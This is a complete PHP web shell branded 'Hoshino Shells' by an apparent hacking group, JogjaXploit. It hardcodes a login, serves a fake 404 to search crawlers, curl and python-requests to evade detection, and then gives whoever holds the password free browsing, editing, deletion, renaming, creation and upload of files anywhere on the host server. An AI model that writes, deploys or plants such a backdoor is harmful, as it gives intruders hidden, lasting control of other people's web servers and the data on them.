<?php
session_start();

$validUsername = 'JogjaXploit';
$validPassword = 'Djaya3';

$blockedUserAgents = [
    'Googlebot', 'Slurp', 'MSNBot', 'PycURL', 'facebookexternalhit',
    'ia_archiver', 'crawler', 'Yandex', 'Rambler', 'Yahoo! Slurp',
    'YahooSeeker', 'bingbot', 'curl', 'python-requests/2.25.1', 'python-requests/2.31.0', 'python-requests'
];

$userAgent = $_SERVER['HTTP_USER_AGENT'];

foreach ($blockedUserAgents as $blockedUserAgent) {
    if (stripos($userAgent, $blockedUserAgent) !== false) {
        header("HTTP/1.0 404 Not Found");
        echo "404 Not Found";
        exit;
    }
}

if (isset($_POST['username']) && isset($_POST['password'])) {
    if ($_POST['username'] === $validUsername && $_POST['password'] === $validPassword) {
        $_SESSION['loggedin'] = true;
    } else {
        echo '<div style="color: red;">Invalid username or password.</div>';
    }
}

if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    echo '<div class="container">';
    echo '<h1>Login</h1>';
    echo '<form method="post">';
    echo 'Username: <input type="text" name="username"><br>';
    echo 'Password: <input type="password" name="password"><br>';
    echo '<input type="submit" value="Login" class="button">';
    echo '</form>';
    echo '</div>';
    exit;
}

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

$path = isset($_GET['path']) ? $_GET['path'] : $_SERVER['DOCUMENT_ROOT'];
$action = isset($_GET['action']) ? $_GET['action'] : '';
$file = isset($_GET['file']) ? $_GET['file'] : '';

echo '<div><strong>Root Directory:</strong> ' . $_SERVER['DOCUMENT_ROOT'] . '</div>';

function getPermissions($file) {
    $perms = fileperms($file);
    $info = '';

    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));

    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));

    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}

function listDirectory($path) {
    $dir = scandir($path);
    echo '<table>';
    echo '<tr><th>Name</th><th>Size</th><th>Permissions</th><th>Action</th></tr>';
    if ($path !== $_SERVER['DOCUMENT_ROOT']) {
        echo '<tr><td colspan="4"><a href="?path=' . urlencode(dirname($path)) . '">Go to previous dir</a></td></tr>';
    }
    foreach ($dir as $item) {
        if ($item == '.' || $item == '..') continue;
        $filePath = $path . DIRECTORY_SEPARATOR . $item;
        $isDir = is_dir($filePath);
        $size = $isDir ? 'N/A' : filesize($filePath);
        $permissions = getPermissions($filePath);
        echo '<tr>';
        echo '<td>' . ($isDir ? '<a href="?path=' . urlencode($filePath) . '">' . $item . '</a>' : $item) . '</td>';
        echo '<td>' . ($isDir ? 'N/A' : $size) . '</td>';
        echo '<td>' . ($isDir ? '-' : $permissions) . '</td>';
        echo '<td>';
        if (!$isDir) {
            echo '<a href="?action=edit&file=' . urlencode($filePath) . '">Edit</a> ';
            echo '<a href="?action=delete&file=' . urlencode($filePath) . '">Delete</a> ';
            echo '<a href="?action=rename&file=' . urlencode($filePath) . '">Rename</a>';
        }
        echo '</td>';
        echo '</tr>';
    }
    echo '</table>';
}

function uploadFile($path) {
    if (isset($_FILES['uploaded_file'])) {
        $target_dir = $path . DIRECTORY_SEPARATOR;
        $target_file = $target_dir . basename($_FILES['uploaded_file']['name']);
        $uploadOk = 1;
        $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

        // Check if file already exists
        if (file_exists($target_file)) {
            echo "Sorry, file already exists.";
            $uploadOk = 0;
        }

        // Check if $uploadOk is set to 0 by an error
        if ($uploadOk == 0) {
            echo "Sorry, your file was not uploaded.";
        } else {
            if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $target_file)) {
                echo "The file " . htmlspecialchars(basename($_FILES['uploaded_file']['name'])) . " has been uploaded.";
            } else {
                echo "Sorry, there was an error uploading your file.";
            }
        }
    }
}

function createNewFolder($path, $folderName) {
    $newFolder = $path . DIRECTORY_SEPARATOR . $folderName;
    if (!file_exists($newFolder)) {
        mkdir($newFolder, 0777, true);
        echo "Folder '" . htmlspecialchars($folderName) . "' created successfully.";
    } else {
        echo "Folder '" . htmlspecialchars($folderName) . "' already exists.";
    }
}

function createNewFile($path, $fileName) {
    $newFile = $path . DIRECTORY_SEPARATOR . $fileName;
    if (!file_exists($newFile)) {
        $fp = fopen($newFile, 'w');
        fclose($fp);
        echo "File '" . htmlspecialchars($fileName) . "' created successfully.";
    } else {
        echo "File '" . htmlspecialchars($fileName) . "' already exists.";
    }
}

// Handle actions
if ($action === 'upload') {
    uploadFile($path);
}

if ($action === 'create_folder') {
    if (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
        createNewFolder($path, $_POST['folder_name']);
    } else {
        echo "Folder name cannot be empty.";
    }
}

if ($action === 'create_file') {
    if (isset($_POST['file_name']) && !empty($_POST['file_name'])) {
        createNewFile($path, $_POST['file_name']);
    } else {
        echo "File name cannot be empty.";
    }
}

if ($action === 'edit' && !empty($file)) {
    if (isset($_POST['content'])) {
        file_put_contents($file, $_POST['content']);
        echo 'File saved! <a href="?path=' . urlencode(dirname($file)) . '">Go back</a>';
    } else {
        $content = file_get_contents($file);
        echo '<h1>Edit File: ' . basename($file) . '</h1>';
        echo '<form method="post">';
        echo '<textarea name="content" rows="20" cols="80">' . htmlspecialchars($content) . '</textarea><br>';
        echo '<input type="submit" value="Save">';
        echo '</form>';
        echo '<a href="?path=' . urlencode(dirname($file)) . '">Cancel</a>';
    }
    exit;
}

if ($action === 'delete' && !empty($file)) {
    if (is_file($file)) {
        unlink($file);
        echo 'File deleted! <a href="?path=' . urlencode(dirname($file)) . '">Go back</a>';
    } else {
        echo 'Invalid file. <a href="?path=' . urlencode(dirname($file)) . '">Go back</a>';
    }
    exit;
}

if ($action === 'rename' && !empty($file)) {
    if (isset($_POST['new_name'])) {
        $newName = dirname($file) . DIRECTORY_SEPARATOR . $_POST['new_name'];
        rename($file, $newName);
        echo 'File renamed! <a href="?path=' . urlencode(dirname($file)) . '">Go back</a>';
    } else {
        echo '<h1>Rename File: ' . basename($file) . '</h1>';
        echo '<form method="post">';
        echo '<input type="text" name="new_name" value="' . basename($file) . '"><br>';
        echo '<input type="submit" value="Rename">';
        echo '</form>';
        echo '<a href="?path=' . urlencode(dirname($file)) . '">Cancel</a>';
    }
    exit;
}

if ($action === 'upload') {
    uploadFile($path);
    exit;
}

if ($action === 'create_folder') {
    if (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
        createNewFolder($path, $_POST['folder_name']);
    } else {
        echo "Folder name cannot be empty.";
    }
    exit;
}

if ($action === 'create_file') {
    if (isset($_POST['file_name']) && !empty($_POST['file_name'])) {
        createNewFile($path, $_POST['file_name']);
    } else {
        echo "File name cannot be empty.";
    }
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Hoshino Shells</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 20px;
        }
        h1 {
            color: #333;
        }
        .action-buttons {
            float: right;
            margin-bottom: 20px; /* Add margin to separate from the content below */
        }
        img {
            display: block;
            margin-top: 20px; /* Add margin to separate the image from the title */
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        th, td {
            border: 1px solid #ddd;
            padding: 8px;
            text-align: left;
        }
        th {
            background-color: #4CAF50;
            color: white;
        }
        tr:nth-child(even) {
            background-color: #f2f2f2;
        }
        tr:hover {
            background-color: #ddd;
        }
        a {
            color: #2196F3;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        form {
            margin-top: 20px;
        }
        input[type="text"], textarea {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            box-sizing: border-box;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        .action-buttons {
            float: right;
        }
    </style>
</head>
<body>
    <h1>Hoshino Shells By MrSanZz - JogjaXploit</h1>

    <!-- Action Buttons -->
    <div class="action-buttons">
        <!-- Upload File Form -->
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="uploaded_file">
            <input type="hidden" name="action" value="upload">
            <input type="submit" value="Upload File">
        </form>

        <!-- Create New Folder Form -->
        <form method="post">
            <input type="text" name="folder_name" placeholder="New Folder Name">
            <input type="hidden" name="action" value="create_folder">
            <input type="submit" value="Create Folder">
        </form>

        <!-- Create New File Form -->
        <form method="post">
            <input type="text" name="file_name" placeholder="New File Name">
            <input type="hidden" name="action" value="create_file">
            <input type="submit" value="Create File">
        </form>
    </div>

    <!-- Image -->
    <img src="https://bnhsec.000webhostapp.com/a/KWBdgN.jpg" alt="My Honey~ 🥰" height="300" width="300">

    <!-- File Listing -->
    <div>
        <?php listDirectory($path); ?>
    </div>
</body>
</html>
